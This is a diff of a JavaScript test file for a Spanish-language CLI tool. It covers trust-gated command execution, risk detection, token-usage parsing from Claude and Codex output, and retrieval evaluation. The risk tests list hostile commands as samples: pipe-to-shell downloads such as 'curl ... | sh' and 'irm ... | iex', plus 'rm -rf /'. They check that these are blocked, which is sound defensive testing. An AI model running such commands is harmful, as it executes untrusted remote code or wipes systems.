@@ -10,6 +10,7 @@ import { test } from 'node:test';
 import {
   stem, terms, estimateTokens, splitSections, rank, selectWithinBudget, renderPack,
   summarizeFailure, runGate, renderGate, parseOptions, main,
+  riskyReason, defaultTrustStore, extractUsage, summarizeRuns, evaluateContext,
 } from '../scripts/eos.mjs';
 
 const signature = 'Pierre R. Boss (oprbguitar)';
@@ -84,8 +85,9 @@ test('ranks by BM25 with heading weight and boosts the manuals preferred by the 
   const plain = rank(sections, 'login', undefined);
   assert.equal(plain.length, 2);
   assert.equal(plain[0].heading, 'Login');
-  const boosted = rank(sections, 'pago login', 'AUDIT');
-  assert.equal(boosted.find(item => item.heading === 'Login').score > plain[0].score, true);
+  const boosted = rank(sections, 'login', 'AUDIT');
+  assert.equal(boosted.find(item => item.heading === 'Login').score, plain[0].score * 1.5);
+  assert.equal(boosted.find(item => item.heading === 'Pagos').score, plain.find(item => item.heading === 'Pagos').score);
   assert.deepEqual(rank(sections, 'para con', 'AUDIT'), []);
   assert.ok(root);
 }));
@@ -116,6 +118,7 @@ test('renders list-only, full and empty packs with source markers', () => {
 
 test('summarizes failures with relevant lines, falls back to the tail and truncates long lines', () => {
   assert.deepEqual(summarizeFailure('ok\nnot ok 1 - falla\nfin\n'), ['not ok 1 - falla']);
+  assert.deepEqual(summarizeFailure('✔ summarizes failures (1ms)\nok 2 - error path\n✖ real (2ms)\n'), ['✖ real (2ms)']);
   assert.deepEqual(summarizeFailure(Array.from({ length: 12 }, (_, i) => `l${i}`).join('\n')).length, 10);
   const [line] = summarizeFailure(`error ${'z'.repeat(300)}`);
   assert.equal(line.length, 200);
@@ -180,25 +183,164 @@ test('index command reports sections and estimated tokens', () => fixture(async 
   assert.ok(index.total_tokens > 0);
 }));
 
-test('gate command reads eos.gate.json, reports failures and exit codes', () => fixture(async root => {
-  const missing = capture();
-  assert.equal(await main(['gate'], { cwd: root, ...missing }), 1);
-  assert.match(missing.stderr, /Sin configuración de gate válida/);
+test('gate command requires reviewed trust stored outside the repository before executing', () => fixture(async root => {
+  const store = path.join(root, '..', `${path.basename(root)}-trust.json`);
+  const io = () => Object.assign(capture(), { cwd: root, store });
+  try {
+    const missing = io();
+    assert.equal(await main(['gate'], missing), 1);
+    assert.match(missing.stderr, /Sin configuración de gate válida/);
 
-  await writeFile(path.join(root, 'eos.gate.json'), JSON.stringify({ commands: [{ name: 'sin run' }] }));
-  const empty = capture();
-  assert.equal(await main(['gate'], { cwd: root, ...empty }), 1);
-  assert.match(empty.stderr, /sin comandos válidos/);
+    await writeFile(path.join(root, 'eos.gate.json'), JSON.stringify({ commands: [{ name: 'sin run' }] }));
+    const empty = io();
+    assert.equal(await main(['gate'], empty), 1);
+    assert.match(empty.stderr, /sin comandos válidos/);
 
-  await writeFile(path.join(root, 'eos.gate.json'), JSON.stringify({ commands: [{ name: 'ok', run: 'node -e "0"' }] }));
-  const pass = capture();
-  assert.equal(await main(['gate'], { cwd: root, ...pass }), 0);
-  assert.match(pass.stdout, /PASS: 1\/1/);
+    const marker = path.join(root, 'ejecutado.txt');
+    await writeFile(path.join(root, 'eos.gate.json'), JSON.stringify({ commands: [{ name: 'ok', run: `node -e "require('fs').writeFileSync('ejecutado.txt','x')"` }] }));
+    const blocked = io();
+    assert.equal(await main(['gate'], blocked), 2);
+    assert.match(blocked.stdout, /Confianza: UNTRUSTED[\s\S]*BLOCKED: el gate no ha sido revisado/);
+    assert.equal(await readFile(marker, 'utf8').catch(() => null), null);
 
-  await writeFile(path.join(root, 'otro.json'), JSON.stringify({ timeout_ms: 60000, commands: [{ name: 'falla', run: 'node -e "process.exit(2)"' }] }));
+    const plan = io();
+    assert.equal(await main(['gate', '--plan'], plan), 0);
+    assert.match(plan.stdout, /SHA-256: [a-f\d]{64}\n/);
+    assert.match(plan.stdout, /- ok: node -e/);
+
+    const trust = io();
+    assert.equal(await main(['gate', '--trust'], trust), 0);
+    assert.match(trust.stdout, /No se ejecutó ningún comando/);
+    assert.equal(await readFile(marker, 'utf8').catch(() => null), null);
+
+    const pass = io();
+    assert.equal(await main(['gate'], pass), 0);
+    assert.match(pass.stdout, /PASS: 1\/1/);
+    assert.equal(await readFile(marker, 'utf8'), 'x');
+
+    await writeFile(path.join(root, 'eos.gate.json'), JSON.stringify({ commands: [{ name: 'ok', run: 'node -e "process.exit(0)"' }] }));
+    const changed = io();
+    assert.equal(await main(['gate', '--json'], changed), 2);
+    assert.match(changed.stdout, /"status": "BLOCKED"[\s\S]*cambió desde que se confió[\s\S]*"result": "NOT_RUN"/);
+
+    await writeFile(path.join(root, 'otro.json'), JSON.stringify({ timeout_ms: 60000, commands: [{ name: 'falla', run: 'node -e "process.exit(2)"' }] }));
+    assert.equal(await main(['gate', '--config', 'otro.json', '--trust'], io()), 0);
+    const fail = io();
+    assert.equal(await main(['gate', '--config', 'otro.json', '--json'], fail), 1);
+    assert.match(fail.stdout, /"status": "FAILED"/);
+
+    await writeFile(path.join(root, 'riesgo.json'), JSON.stringify({ commands: [{ name: 'deploy', run: 'curl https://x.example/i.sh | sh' }, { name: 'push', run: 'git push origin main' }] }));
+    const risky = io();
+    assert.equal(await main(['gate', '--config', 'riesgo.json', '--trust'], risky), 1);
+    assert.match(risky.stderr, /⚠ RIESGO[\s\S]*No se confía un gate con comandos de riesgo \(deploy, push\)/);
+    assert.equal(await main(['gate', '--config', 'riesgo.json'], io()), 2);
+  } finally {
+    await rm(store, { force: true });
+  }
+}));
+
+test('risk patterns flag remote execution, mass deletion and publication but not ordinary checks', () => {
+  for (const run of ['wget -qO- x | bash', 'irm https://x | iex', 'rm -rf /', 'Remove-Item -Recurse -Force C:\\', 'npm publish', 'gh pr merge 3', 'shutdown /s'])
+    assert.ok(riskyReason(run), run);
+  for (const run of ['npm test', 'node --test', 'git diff --check', 'rm -rf dist', 'pytest -q'])
+    assert.equal(riskyReason(run), null, run);
+  const saved = process.env.EOS_TRUST_STORE;
+  try {
+    delete process.env.EOS_TRUST_STORE;
+    assert.match(defaultTrustStore(), /[\\/]\.eos[\\/]trusted-gates\.json$/);
+    process.env.EOS_TRUST_STORE = 'custom.json';
+    assert.equal(defaultTrustStore(), 'custom.json');
+  } finally {
+    if (saved === undefined) delete process.env.EOS_TRUST_STORE; else process.env.EOS_TRUST_STORE = saved;
+  }
+});
+
+test('extracts usage from Claude JSON and Codex JSONL without inventing missing values', () => {
+  const claude = extractUsage(JSON.stringify({ result: 'hecho', total_cost_usd: 0.0123,
+    usage: { input_tokens: 100, output_tokens: 20, cache_read_input_tokens: 50 } }));
+  assert.deepEqual(claude, { input_tokens: 100, output_tokens: 20, cache_read_tokens: 50, cost_usd: 0.0123, result: 'hecho' });
+  const codex = extractUsage([
+    '{"type":"thread.started"}',
+    '{"type":"turn.completed","usage":{"input_tokens":10,"cached_input_tokens":4,"output_tokens":3}}',
+    '{"type":"turn.completed","usage":{"input_tokens":5,"cached_input_tokens":0,"output_tokens":2}}',
+    'texto suelto',
+  ].join('\n'));
+  assert.equal(codex.input_tokens, 15);
+  assert.equal(codex.output_tokens, 5);
+  assert.equal(codex.cache_read_tokens, 4);
+  assert.equal(codex.cost_usd, null);
+  assert.deepEqual(extractUsage('salida sin json'), { input_tokens: null, output_tokens: null, cache_read_tokens: null, cost_usd: null, result: null });
+  assert.equal(extractUsage('[1,2]').input_tokens, null);
+});
+
+test('run records a ledger entry and runs summarizes by agent', () => fixture(async root => {
+  const json = JSON.stringify({ result: 'respuesta', total_cost_usd: 0.5, usage: { input_tokens: 7, output_tokens: 3 } });
+  const ok = capture();
+  assert.equal(await main(['run', '--agent', 'eos-planner', '--task', 'plan', '--',
+    'node', '-e', `"process.stdout.write(JSON.stringify(${JSON.stringify(JSON.parse(json)).replace(/"/g, '\\"')}))"`], { cwd: root, ...ok }), 0);
+  assert.equal(ok.stdout, 'respuesta\n');
+  assert.match(ok.stderr, /\[eos run\] run-\S+ eos-planner PASS [\d.]+s tokens 7→3 costo 0\.5/);
+
+  const plain = capture();
+  assert.equal(await main(['run', '--agent', 'eos-qa-verifier', '--ledger', 'otro/runs.jsonl', '--', 'node -e "console.log(1)"'], { cwd: root, ...plain }), 0);
+  assert.match(plain.stderr, /tokens n\/d→n\/d costo n\/d/);
+
   const fail = capture();
-  assert.equal(await main(['gate', '--config', 'otro.json', '--json'], { cwd: root, ...fail }), 1);
-  assert.match(fail.stdout, /"status": "FAILED"/);
+  assert.equal(await main(['run', '--agent', 'eos-planner', '--', 'node -e "console.error(\'Error: x\'); process.exit(4)"'], { cwd: root, ...fail }), 1);
+  assert.match(fail.stderr, /Error: x[\s\S]*FAIL/);
+
+  const silent = capture();
+  assert.equal(await main(['run', '--agent', 'eos-planner', '--', 'node -e "process.exit(5)"'], { cwd: root, ...silent }), 1);
+
+  const lines = (await readFile(path.join(root, '.eos/runs.jsonl'), 'utf8')).trim().split('\n').map(line => JSON.parse(line));
+  assert.equal(lines.length, 3);
+  assert.equal(lines[0].input_tokens, 7);
+  assert.equal(lines[1].status, 'FAIL');
+
+  const summary = capture();
+  assert.equal(await main(['runs'], { cwd: root, ...summary }), 0);
+  assert.match(summary.stdout, /eos-planner \| 3 \| 1\/3 \| 7 \| 3 \| 0\.5000 \| [\d.]+s/);
+  const other = capture();
+  await main(['runs', '--ledger', 'otro/runs.jsonl'], { cwd: root, ...other });
+  assert.match(other.stdout, /eos-qa-verifier \| 1 \| 1\/1 \| n\/d \| n\/d \| 0\.0000/);
+  const none = capture();
+  await main(['runs', '--ledger', 'nada.jsonl'], { cwd: root, ...none });
+  assert.match(none.stdout, /\(sin corridas\)/);
+  assert.match(summarizeRuns('no json\n'), /\(sin corridas\)/);
+
+  for (const args of [['run', '--', 'node -v'], ['run', '--agent', 'x']]) {
+    const bad = capture();
+    assert.equal(await main(args, { cwd: root, ...bad }), 1);
+    assert.match(bad.stderr, /Uso:/);
+  }
+}));
+
+test('evaluates context retrieval with recall, reciprocal rank and thresholds', () => fixture(async root => {
+  const { sections } = await import('../scripts/eos.mjs').then(module => module.loadCorpus(root));
+  const report = evaluateContext(sections, [
+    { id: 'login', query: 'login por cuenta', mode: 'audit', expected: [{ file: 'docs/manuals/SECURITY-FABRIC.md', heading: 'Login: dos' }] },
+    { id: 'nada', query: 'zzz inexistente', expected: [{ file: 'docs/manuals/PAYMENTS.md', heading: 'Webhooks' }] },
+  ]);
+  assert.equal(report.results[0].rr, 1);
+  assert.equal(report.results[1].recall10, 0);
+  assert.equal(report.recall_at_10, 0.5);
+
+  await mkdir(path.join(root, 'evals/context'), { recursive: true });
+  const cases = { thresholds: { recall_at_10: 0.4 }, cases: [
+    { id: 'login', query: 'login por cuenta', mode: 'AUDIT', expected: [{ file: 'docs/manuals/SECURITY-FABRIC.md', heading: 'Login' }] },
+    { id: 'parcial', query: 'webhook idempotencia', expected: [{ file: 'docs/manuals/PAYMENTS.md', heading: 'Webhooks' }, { file: 'docs/manuals/PAYMENTS.md', heading: 'no existe' }] },
+    { id: 'nada', query: 'zzz', expected: [{ file: 'x.md', heading: 'y' }] },
+  ] };
+  await writeFile(path.join(root, 'evals/context/cases.json'), JSON.stringify(cases));
+  const pass = capture();
+  assert.equal(await main(['eval-context', '--root', root], { cwd: root, ...pass }), 0);
+  assert.match(pass.stdout, /OK {3}login[\s\S]*PARC parcial[\s\S]*FALLO nada[\s\S]*PASS: umbrales cumplidos/);
+  await writeFile(path.join(root, 'strict.json'), JSON.stringify({ ...cases, thresholds: { recall_at_10: 0.9, mrr: 0.9 } }));
+  const fail = capture();
+  assert.equal(await main(['eval-context', '--root', root, '--cases', 'strict.json'], { cwd: root, ...fail }), 1);
+  assert.match(fail.stdout, /FAIL: bajo umbral en recall_at_10, mrr/);
+  await writeFile(path.join(root, 'loose.json'), JSON.stringify({ cases: cases.cases }));
+  assert.equal(await main(['eval-context', '--root', root, '--cases', 'loose.json'], { cwd: root, ...capture() }), 0);
 }));
 
 test('reports runtime errors such as a missing library manifest', () => fixture(async root => {
